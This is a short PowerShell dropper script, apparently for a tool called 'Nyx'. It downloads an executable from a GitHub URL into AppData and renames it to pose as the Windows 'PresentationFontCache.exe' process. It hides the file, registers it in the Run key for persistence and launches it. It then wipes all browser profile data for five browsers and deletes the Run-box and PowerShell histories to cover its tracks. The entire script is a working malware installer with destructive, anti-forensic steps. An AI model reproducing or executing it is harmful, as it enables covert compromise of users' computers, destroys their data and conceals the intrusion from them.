# Nyx - N5FSY8RK

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "N5FSY8RK" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/N5FSY8RK/N5FSY8RK.exe -OutFile "$env:APPDATA\N5FSY8RK\N5FSY8RK.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\N5FSY8RK\N5FSY8RK.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\N5FSY8RK\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "N5FSY8RK" `
-Value "$env:APPDATA\N5FSY8RK\PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\N5FSY8RK\PresentationFontCache.exe"

# Remove browser data
Remove-Item "$env:LOCALAPPDATA\Microsoft\Internet Explorer\*" -Recurse -Force
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*" -Recurse -Force
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\*" -Recurse -Force
Remove-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*" -Recurse -Force
Remove-Item "$env:APPDATA\Opera Software\Opera Stable\*" -Recurse -Force

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
